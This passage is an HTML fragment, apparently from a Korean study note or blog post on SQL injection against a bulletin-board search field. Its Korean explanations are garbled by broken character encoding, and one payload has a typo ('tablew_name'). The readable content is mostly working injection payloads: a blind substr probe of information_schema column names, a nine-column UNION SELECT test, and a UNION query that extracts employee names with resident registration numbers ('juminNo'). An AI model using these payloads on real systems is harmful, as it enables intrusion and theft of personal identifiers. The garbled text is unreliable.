                    <ul>
                      <li>POST ì˜ Message Body ì˜ì—­ì— URIEncoding ë°©ì‹ìœ¼ë¡œ ë³€ê²½ë˜ì–´ ì „ì†¡ë¨</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>ì»¬ëŸ¼ì •ë³´ íšë“ (íšë“í•œ í…Œì´ë¸” ì •ë³´ employee)
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and substr((select column_name from information_schema.columns where tablew_name='employee' limit 0,1),1,1)='a'#</code></li>
                </ul>
              </li>
              <li>Data íšë“ (íšë“í•œ ì»¬ëŸ¼ì •ë³´ ì´ìš©)
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select 'a','b','c','d','e','f','g','h','i'#</code>
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'#%'
</code></pre></div>                    </div>
                    <ul>
                      <li>1=2 ë¥¼ í†µí•´ ì› ê²€ìƒ‰ê²°ê³¼ ì¶œë ¥ì„ ë§‰ìŒ</li>
                      <li>í•„ë“œê°œìˆ˜ 9ê°œ : bbsì˜ í•„ë“œê°œìˆ˜ì™€ ë™ì¼í•˜ê²Œ ì„¤ì •</li>
                      <li>ì¶œë ¥ ê²°ê³¼ë¥¼ í†µí•´ ì›¹ì‚¬ì´íŠ¸ì˜ í•„ë“œê°€ ì–´ë–¤ ì»¬ëŸ¼ê³¼ ë§¤í•‘ë˜ëŠ”ì§€ í™•ì¸</li>
                    </ul>
                  </li>
                  <li>ì¶œë ¥ìœ„ì¹˜ í™•ì¸ í›„ í•´ë‹¹ ìœ„ì¹˜ë¡œ employee í…Œì´ë¸”ì˜ ì¡°íšŒê²°ê³¼ ì¶œë ¥</li>
                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select null,null,null,concat(name, '/', juminNo), null, null, null, null, null from employee#</code>
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select null, null, null, concat(name, '/', juminNo), null, null, null, null, null from employee#%'
</code></pre></div>                    </div>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>
:ET